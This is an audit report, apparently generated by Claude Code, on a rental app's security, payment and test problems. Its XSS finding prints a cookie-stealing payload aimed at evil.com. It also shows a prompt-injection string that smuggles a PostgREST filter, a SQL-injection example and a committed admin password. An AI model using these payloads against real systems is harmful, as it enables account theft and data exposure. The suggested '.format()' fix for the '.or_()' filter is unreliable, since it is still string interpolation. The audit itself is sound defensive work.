# AXIOM V2 — Full Project Audit Report
**Date:** June 1, 2026
**Deadline:** June 22, 2026 (21 days remaining)
**Auditor:** Claude Code (claude-sonnet-4-6)
**Branch:** feat/owner-subscriptions

---

## Executive Summary

| Layer | State |
|-------|-------|
| TypeScript compilation | ✅ Zero errors |
| Backend tests | ⚠️ 118/122 passing (4 failures) |
| Frontend pages | ✅ All built |
| Auth | ✅ Wired (Supabase + JWT) |
| AI features | ✅ Implemented |
| Subscriptions | ⚠️ Logic done, Stripe prices not configured |
| Booking (rent) | ✅ End-to-end implemented |
| Notifications | ❌ Shell only — never populated |
| Deployment | ❌ Not done |

---

## 🔴 CRITICAL — Security

### 1. Stripe Keys in Git History
**Risk:** Real money exposure.
Old Stripe keys were committed before `.env` was gitignored. Keys still exist in git history.
**Action required:** Rotate keys NOW in Stripe dashboard — rotation is the only fix since the history cannot be safely scrubbed without rebasing all branches.

### 2. Admin Password in `.env.example`
**File:** `backend/.env.example:21`
```
ADMIN_PASSWORD=axiom_admin_2026
```
This file is committed to the repository. Anyone with repo access has the admin panel password.
**Fix:** Replace with `ADMIN_PASSWORD=change-me-in-production` and set a strong value in the actual `.env`.

### 3. Real Supabase Credentials in `.env.example`
**File:** `backend/.env.example:6-7`
The live project URL (`https://pgaqqseqwtgsuihbswnv.supabase.co`) and full anon key are hardcoded. Anon keys are designed to be public, but the URL should not be the live project URL in an example file.

### 4. Admin JWT Uses Same Secret as Regular Users
**File:** `backend/app/admin/router.py:58`
`_create_admin_token()` signs with `settings.jwt_secret` — the same secret that validates regular user JWTs. If the secret leaks, an attacker can forge an admin token.
**Fix:** Add a separate `admin_jwt_secret` config field.

### 5. No Rate Limiting on AI Endpoints
`/api/ai/chat` and `/api/ai/search` call local Ollama per request with no throttle or per-user quota. A single unauthenticated user can hammer Ollama into OOM.
**Fix:** Add a simple per-IP rate limit middleware (e.g., `slowapi`).

---

## 🔴 HIGH — XSS (Stored Cross-Site Scripting)

**File:** `frontend/src/components/blog-article/ArticleBody.tsx:34, 99`

Blog article body is rendered directly as raw HTML:
```tsx
<p dangerouslySetInnerHTML={{ __html: block.text }} />
<li dangerouslySetInnerHTML={{ __html: item }} />
```

If a blog post is created (via admin panel) with malicious content like `<script>alert(document.cookie)</script>` or `<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">`, it executes in every visitor's browser. This is a **stored XSS** — the payload persists in the DB and fires for every reader.

**Fix:** Sanitize HTML before rendering. Install `dompurify` and wrap:
```tsx
import DOMPurify from "dompurify";
// ...
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(block.text) }}
```

---

## 🟠 MEDIUM — PostgREST Filter Injection via LLM Output

**Files:** `backend/app/ai/router.py:353`, `backend/app/ai/router.py:469`

The AI search endpoint extracts a `location` from the user's natural language query using the LLM, then directly interpolates it into a PostgREST `.or_()` filter:

```python
loc = filters["location"]   # comes from LLM — attacker-controlled via prompt
db_query = db_query.or_(f"city.ilike.%{loc}%,location.ilike.%{loc}%")
```

An adversarial prompt like _"apartments in cairo,owner_id.neq.null"_ could make the LLM return `location = "cairo,owner_id.neq.null"`, injecting an extra filter condition into the PostgREST query string. This is **prompt injection → query filter injection**.

**Fix:** Strip commas and PostgREST special characters from the extracted location before using it:
```python
import re
loc = re.sub(r"[,().\[\]\"'`]", "", filters["location"])[:100]
```

---

## 🟠 MEDIUM — Internal Error Details Leaked to Clients

**Files:** 30+ locations across `backend/app/admin/router.py`, `listings/router.py`, `uploads/router.py`, `subscriptions/router.py`

Pattern repeated everywhere:
```python
raise HTTPException(status_code=500, detail=f"Database error: {e}")
raise HTTPException(status_code=500, detail=f"Failed to create listing: {e}")
raise HTTPException(status_code=502, detail=str(e))  # Stripe exceptions
```

Postgres error messages and Stripe exception messages are returned verbatim to the client. These leak: table names, column names, constraint names, DB schema details, and Stripe internal error codes.

**Fix:** Log the real error server-side; return a generic message to the client:
```python
import logging
logger = logging.getLogger(__name__)
# ...
except Exception as e:
    logger.error("DB error in create_listing: %s", e)
    raise HTTPException(status_code=500, detail="Internal server error")
```

---

## 🟠 MEDIUM — LIKE Wildcard Abuse (Resource Exhaustion)

**Files:** `listings/router.py:124`, `admin/router.py:241`, `agencies/router.py:54`, `ai/router.py:353, 469`, `ai/fraud.py:50`, and others

All search filters use a leading-wildcard `ilike` with raw user input:
```python
query.ilike("city", f"%{city}%")    # city comes from query param
```

PostgreSQL `LIKE` with a leading `%` forces a full sequential scan. An attacker can pass a pattern like `city=a%b%c%d%e%f%g%h%i%j%k%l%m%n` with many wildcards, creating a regex-like catastrophic backtrack on every row. With no auth required on `/api/listings`, this is an unauthenticated DoS vector.

**Fix:** Sanitize wildcard characters from user-supplied search strings:
```python
city_safe = city.replace("%", "").replace("_", "")[:100]
query.ilike("city", f"%{city_safe}%")
```

---

## 🟡 LOW — No Enum Validation on `category` and `property_type`

**File:** `backend/app/listings/schemas.py:20-21`

```python
category: str       # accepts any string — no validation
property_type: str  # accepts any string — no validation
```

These should be `Literal` types. As-is, a user submitting `category="'; DROP TABLE listings; --"` won't cause SQL injection (Supabase parameterizes `.eq()` calls) but will trigger a Postgres constraint violation whose error message is bubbled up verbatim (see above).

**Fix:**
```python
from typing import Literal
category: Literal["for_rent", "for_sale", "shared_housing"]
property_type: Literal["apartment", "villa", "studio", "duplex", "penthouse",
                        "commercial", "room", "chalet", "townhouse", "twin_house",
                        "land", "whole_building", "office"]
```

---

## 🟡 LOW — Unbounded `conversation_history` in Chat Endpoint

**File:** `backend/app/ai/router.py:ChatRequest`

```python
class ChatRequest(BaseModel):
    message: str = Field(..., max_length=2000)   # bounded ✅
    conversation_history: list[dict] = []         # NO limit ❌
```

`message` is capped at 2000 chars but `conversation_history` has no length limit. An attacker can submit a single chat request with 10,000 history items, each with large content, forcing the backend to process a massive prompt through Ollama.

**Fix:**
```python
from pydantic import Field
conversation_history: list[dict] = Field(default=[], max_length=20)
```

---

## 🟡 LOW — `.or_()` f-string with JWT `user_id`

**File:** `backend/app/dashboard/router.py:183`

```python
.or_(f"requester_id.eq.{user_id},owner_id.eq.{user_id}")
```

`user_id` is extracted from a verified Supabase JWT (always a UUID v4), so injection is near-impossible in practice. But if Supabase ever changes the format, or if this pattern is copied elsewhere with less trusted input, it becomes injectable.

**Fix:** Use the parameterized form supported by postgrest-py:
```python
.or_("requester_id.eq.{uid},owner_id.eq.{uid}".format(uid=user_id))
# or break into two separate .eq() + .or_() calls
```

---

## 🟡 LOW — No File Type Validation in Upload Endpoint

**File:** `backend/app/uploads/router.py:36-37`

The signed URL endpoint accepts any file extension:
```python
ext = body.filename.rsplit(".", 1)[-1] if "." in body.filename else ""
```

No check that `ext` is an image type (`jpg`, `png`, `webp`). An authenticated user can request a signed URL for `.html`, `.svg` (XSS via SVG), `.exe`, etc. Supabase Storage will serve these files with whatever MIME type it infers.

**Fix:**
```python
ALLOWED_EXTENSIONS = {"jpg", "jpeg", "png", "webp", "gif"}
if ext.lower() not in ALLOWED_EXTENSIONS:
    raise HTTPException(status_code=400, detail="File type not allowed")
```

---

## 🔴 CRITICAL — Backend Test Failures

### Failures: `test_ai_chat_streams`, `test_rag_chat_with_context`, `test_rag_chat_no_context`

**Root cause:** Tests mock `ollama.generate_stream` but the chat endpoint was refactored to call `ollama.chat_stream`. The unmocked `chat_stream` returns a plain `MagicMock`. When `generate_sse()` calls `await token_gen.aclose()` at `ai/router.py:694`, it crashes:

```
TypeError: 'MagicMock' object can't be awaited
```

**Fix** in `backend/tests/test_ai.py` — three locations:

```python
# WRONG (current)
ollama.generate_stream = fake_stream

# CORRECT
ollama.chat_stream = fake_stream
```

Lines to change: `test_ai.py:96`, `test_ai.py:371`, `test_ai.py:392`.

---

### Failure: `test_detect_property_search_vague`

```
AssertionError: assert 45 < 40
```

`_detect_property_search("I need a place")` scores 45; test expects < 40.
The word "place" or other generic terms are adding excess score.

**Fix** in `backend/app/ai/router.py` — lower the weight for vague terms or remove "place" from scored keywords.

---

## 🟠 Logic Errors

### 1. `_sync_subscription` Uses `.update()` Instead of `.upsert()`
**File:** `backend/app/stripe_webhooks/router.py:35-42`

When a `customer.subscription.created` webhook fires for a new subscriber whose `subscriptions` row hasn't been created yet, `.update()` silently no-ops. The plan is never written. The user pays but stays on Free.

```python
# CURRENT — silently does nothing if row missing
supabase_admin.table("subscriptions").update({...}).eq("user_id", user_id).execute()

# FIX
supabase_admin.table("subscriptions").upsert({
    "user_id": user_id,
    ...
}, on_conflict="user_id").execute()
```

### 2. Webhook Swallows All Exceptions Silently
**File:** `backend/app/stripe_webhooks/router.py:80-81`

```python
except Exception:
    pass  # booking creation and subscription sync failures are invisible
```

Any failure in `_create_booking_from_paid_intent` or `_sync_subscription` is silently dropped. Stripe retries webhooks on non-2xx but this always returns 200. Failed payments could create no booking and Stripe would stop retrying.

**Fix:** At minimum, log the exception. Return a 500 on unexpected errors so Stripe retries.

### 3. Sale Booking Dead Code Still Present
**Files:** `bookings/router.py:84-86`, `bookings/router.py:237`

`_compute_fee()` raises HTTP 400 for any non-rent booking. But `_listing_status_for("sale")` and `_create_booking_from_paid_intent` still contain sale-specific branches. This code is unreachable but confusing and could cause issues if sale payment is ever re-enabled carelessly.

---

## 🟠 Missing / Unfinished Features

### 1. Stripe Subscription Prices Not Configured
**File:** `backend/.env.example:31-33` / `backend/app/config.py:29-30`

```
STRIPE_PRICE_BASIC=   # empty
STRIPE_PRICE_PRO=     # empty
```

Every call to `POST /api/subscriptions/checkout` returns HTTP 503 until these are set. The entire monetization layer is non-functional without them.

**Steps to fix:**
1. Create recurring EGP prices in Stripe dashboard (Basic = 199 EGP/mo, Pro = 499 EGP/mo)
2. Copy the `price_XXXX` IDs into `backend/.env`
3. Run `stripe listen --forward-to localhost:8000/api/stripe/webhook` and test full checkout → webhook → plan sync flow

### 2. Notifications Feature is a Shell
**Router:** `backend/app/notifications/router.py` — GET/mark-read endpoints exist.
**Problem:** Zero code anywhere inserts a notification row. Not in bookings, listings, viewings, applications, or admin routers.

If a notifications tab is visible in the frontend, it will always be empty. Either wire up inserts at key events (booking confirmed, listing approved/rejected, application received) or hide the UI.

### 3. Shared Housing Not Bookable
No `BookingModal` is shown for `shared_housing` category listings. The ROADMAP notes this as "Layer 2 spec — not yet implemented." Users see a property but cannot initiate a booking. The intended flow (application → roommate compatibility → booking) is partially built but not connected.

### 4. Homepage Listings Are Mock / Static
**File:** `frontend/src/app/(marketing)/page.tsx`

The homepage loads static sections (`TestimonialsSection`, `NeighborhoodGuides`, `VibeMatchesSection`, `TrustedPartners`, `HowItWorksSection`). `RecommendationsSectionClient` calls the real API, but the hero search results and featured property grid (if any) come from hardcoded content.

ROADMAP item: "Wire homepage listings — replace mock listings on `/` with Supabase query."

### 5. `/pricing` Page Has No Navigation Entry
**File:** `frontend/src/components/layout/Navbar.tsx`

The pricing page (`/pricing`) exists and is fully functional but is not linked in the navbar, dashboard, or any other page. Users on the Free plan who hit a quota cap see a toast/banner (from the subscription gate), but there is no link to `/pricing` from the navbar or dashboard.

### 6. SQL Migrations — Unknown Apply Status
Five migration files exist in `backend/sql/`. The ROADMAP says to apply `2026-05-15_all_new_features.sql`. It is unclear which have been run against the live Supabase instance.

| File | Status |
|------|--------|
| `2026-05-15_all_new_features.sql` | ⚠️ ROADMAP says run this |
| `2026-05-16_profile_whatsapp_and_avatars.sql` | Unknown |
| `2026-05-28_stripe_booking_payout.sql` | Unknown |
| `2026-05-29_payment_fees_model.sql` | Unknown |
| `2026-05-30_owner_subscriptions.sql` | Unknown |

---

## 🔴 CRITICAL — Payment Flow Bugs

### Step-by-step analysis of the rent booking deposit flow

```
User picks dates → POST /payment-intent → Stripe CardElement → confirmCardPayment
→ syncPaidBooking → POST /sync-payment → booking created → listing locked
                 ↘ fallback: poll GET /by-intent/{id} (10 attempts × 1s)
Webhook: payment_intent.succeeded → _create_booking_from_paid_intent (backup path)
```

---

### 1. Double-Charge Race Condition (No Listing Lock)
**Severity: 🔴 CRITICAL**

`POST /api/bookings/payment-intent` checks listing is `active` but **does not lock the listing**. Window between PaymentIntent creation and payment completion is ~30–60 seconds (user fills in card). Two users booking the same listing simultaneously:

1. Both pass `_fetch_active_listing` check → both get a `client_secret` ✅
2. Both complete `stripe.confirmCardPayment` → **both cards are charged** ✅
3. First `sync-payment` call creates booking → listing set to `"booked"`
4. Second `_create_booking_from_paid_intent` → `_fetch_active_listing` raises HTTP 409
5. Webhook handler catches it with `except Exception: pass` → returns 200 to Stripe
6. **Second user is charged EGP 2,000 with no booking and no automatic refund**

**Fix:** Set listing status to `"pending_payment"` when the PaymentIntent is created. Revert on `payment_intent.canceled` webhook event. Only one PaymentIntent can exist per `"pending_payment"` listing at a time.

---

### 2. Webhook Silently Drops Booking Creation Failures
**Severity: 🔴 CRITICAL**
**File:** `backend/app/stripe_webhooks/router.py:79-81`

```python
try:
    if event_type == "payment_intent.succeeded":
        _create_booking_from_paid_intent(obj)
    elif event_type in ("customer.subscription.created", ...):
        _sync_subscription(obj)
except Exception:
    pass   # ← swallows ALL errors, returns 200
```

Any exception in booking creation (DB down, listing double-booked, metadata missing) returns HTTP 200 to Stripe. Stripe considers the webhook delivered and **never retries**. User is charged, no booking is created, no alert is raised. This is the most dangerous single line in the codebase.

**Fix:**
```python
except Exception as e:
    logger.error("Webhook handler failed for %s: %s", event_type, e)
    raise HTTPException(status_code=500, detail="Webhook processing failed")
    # 500 → Stripe retries up to 3 days
```
Only swallow errors that are truly idempotent (duplicate booking already exists).

---

### 3. Frontend Fee Hardcoded — Diverges from Backend Config
**Severity: 🟠 MEDIUM**
**File:** `frontend/src/components/booking/BookingModal.tsx:58`

```tsx
const RENT_BOOKING_FEE = 2000;  // hardcoded — user sees this before paying
```

Actual charge comes from `settings.rent_booking_fee` in `backend/app/config.py` (also `2000` by default). If the backend config changes, the UI displays the wrong amount. The user consents to pay X but is charged Y — a consumer protection issue.

**Fix:** Use `paymentIntent.booking_preview.total_price` (already returned by the API) instead of the hardcoded constant.

---

### 4. Test Card Hint Visible in Production UI
**Severity: 🟠 MEDIUM**
**File:** `frontend/src/components/booking/BookingModal.tsx:261`

```tsx
<p className="text-xs text-gray-500">Test card: 4242 4242 4242 4242</p>
```

Hardcoded in the payment component. Ships to production as-is, undermining trust.

**Fix:** Conditionally render only when `process.env.NODE_ENV === "development"`.

---

### 5. Back Button Does Not Cancel the PaymentIntent
**Severity: 🟡 LOW**

When user presses "Back" from the payment step, `setStep("details")` is called. The Stripe PaymentIntent remains open (valid for 24h). If user changes the dates and proceeds again, a new PaymentIntent is created. The old one lingers, polluting Stripe dashboard and complicating reconciliation.

**Fix:** Add a `POST /api/bookings/cancel-intent` endpoint that calls `stripe.PaymentIntent.cancel(id)`, and call it when navigating back.

---

### 6. 10-Second Poll Timeout Too Short for Webhook Delay
**Severity: 🟡 LOW**
**File:** `frontend/src/components/booking/BookingModal.tsx:79-87`

```ts
for (let attempt = 0; attempt < 10; attempt++) {
  // poll GET /api/bookings/by-intent/{id}
  await sleep(1000);
}
throw new Error("Payment succeeded, but the booking is still being created...");
```

Stripe webhook delivery can take 1–5 minutes in production. User sees an error after 10 seconds even though they were successfully charged. The error message text is acceptable but there is no link to the dashboard where the booking will eventually appear.

**Fix:** Add `href="/dashboard?tab=bookings"` link inside the error message.

---

### 7. No Billing Address Collected
**Severity: 🟡 LOW**

`CardElement` collects card number, expiry, CVC — no postal code or billing address. Egyptian bank cards may decline more frequently without address verification. Stripe recommends enabling postal code collection:

```tsx
<CardElement options={{ hidePostalCode: false }} />
```

---

### Payment Flow Summary

| Step | Issue | Severity |
|------|-------|----------|
| PaymentIntent creation | No listing lock → double-charge race condition | 🔴 CRITICAL |
| Webhook handler | `except Exception: pass` → charge with no booking, Stripe stops retrying | 🔴 CRITICAL |
| Fee display | `RENT_BOOKING_FEE = 2000` hardcoded — diverges from backend config | 🟠 MEDIUM |
| Payment UI | Test card hint ships to production | 🟠 MEDIUM |
| Back button | PaymentIntent not cancelled → dangling Stripe objects | 🟡 LOW |
| Poll fallback | 10s too short for webhook delay — no dashboard link in error | 🟡 LOW |
| Card element | No billing address → higher Egyptian card decline rate | 🟡 LOW |
| Dead type | `booking_type: "rent" \| "sale"` in `queries.ts` — sale removed | 🟡 CLEANUP |

---

## 🟡 Missing Test Coverage

| Area | Gap |
|------|-----|
| `subscriptions/router.py` | No tests for checkout, cancel, start-trial |
| `stripe_webhooks/router.py` | No tests — the most critical financial path has zero coverage |
| Booking flow integration | No test: create intent → sync-payment → confirm → refund |
| `subscriptions/lapse.py` | No tests for `pause_excess_for_user` or `delete_expired_paused_once` |

---

## 🟡 Dead Code / Cleanup

| Item | Location |
|------|----------|
| `MOCK_AGENCIES` + `MOCK_AGENCY_DETAILS` constants — defined, never imported by any page | `frontend/src/lib/constants.ts:300-500+` |
| `sale_reservation_pct` + `sale_reservation_cap` config fields — sale payment removed | `backend/app/config.py:34-35` |
| `_listing_status_for()` sale branch — unreachable since `_compute_fee()` blocks sale | `bookings/router.py:84-86` |

---

## ✅ What Works

- TypeScript: zero compilation errors
- 118/122 backend tests pass
- All frontend pages built and rendering
- Supabase auth wired (email, Facebook OAuth, phone OTP)
- AI chatbot (SSE streaming + RAG + citations)
- AI NLP search (filter extraction + pgvector hybrid)
- AI description generator (bilingual AR/EN) with quota gate
- AI roommate compatibility scoring
- Fraud detection (runs on every listing creation)
- Rent booking deposit flow (create intent → Stripe → webhook → booking → confirm → refund)
- Owner subscription plan logic (free/trial/basic/pro/agency tiers)
- Listing + AI quota gates
- Pricing page UI
- Admin CRUD (listings, users, leads, agencies, universities, applications)
- Dashboard (bookings, applications, liked listings, analytics, profile)
- WhatsApp lead capture
- Shared housing applications + roommate search

---

## Priority Order (21 Days to Deadline)

| # | Task | Effort | Impact |
|---|------|--------|--------|
| 1 | **Rotate Stripe keys** (git history leak) | 10 min | 🔴 Security |
| 2 | **Fix double-charge race condition** — lock listing on PaymentIntent creation | 2 hr | 🔴 Money |
| 3 | **Fix webhook `except Exception: pass`** — return 500 so Stripe retries | 15 min | 🔴 Money |
| 4 | **Fix webhook `_sync_subscription` upsert** — `.update()` → `.upsert()` | 15 min | 🔴 Subscriptions |
| 5 | **Fix XSS in `ArticleBody.tsx`** — add DOMPurify | 30 min | 🔴 Stored XSS |
| 6 | **Fix PostgREST injection** in AI router — strip special chars from LLM location | 15 min | 🟠 Injection |
| 7 | **Fix error detail leaks** — log + return generic 500 | 1 hr | 🟠 Info disclosure |
| 8 | **Fix frontend fee hardcode** — use `booking_preview.total_price` not `2000` | 15 min | 🟠 Incorrect amount shown |
| 9 | **Remove test card hint** from payment UI (dev-only conditional) | 5 min | 🟠 Production polish |
| 10 | **Fix 4 backend test failures** (3 mock swap + 1 threshold) | 1 hr | Tests green |
| 11 | **Add enum `Literal` types** on `category`/`property_type` | 30 min | 🟡 Validation |
| 12 | **Add LIKE wildcard sanitization** on all `ilike` search params | 30 min | 🟠 DoS |
| 13 | **Cap `conversation_history`** to 20 items | 5 min | 🟡 Resource abuse |
| 14 | **Restrict file upload extensions** in signed-url endpoint | 15 min | 🟡 SVG XSS |
| 15 | **Configure Stripe price IDs** + end-to-end subscription QA | 2 hr | Monetization works |
| 16 | **Apply + verify SQL migrations** | 1 hr | DB consistency |
| 17 | **Add `/pricing` link** to navbar or dashboard | 30 min | Discoverability |
| 18 | **Wire homepage listings** from Supabase | 2 hr | Live data on landing page |
| 19 | **Notifications: insert at key events** OR hide the UI | 2 hr | No empty tabs |
| 20 | **Add dashboard link** to poll-timeout error message in BookingModal | 15 min | UX |
| 21 | **Deployment** (Vercel + Railway + GitHub Actions) | 1 day | Graders need live URL |
| 22 | Dead code cleanup | 30 min | Polish |

---

*Generated by Claude Code audit — `feat/owner-subscriptions` @ `b7020da`*
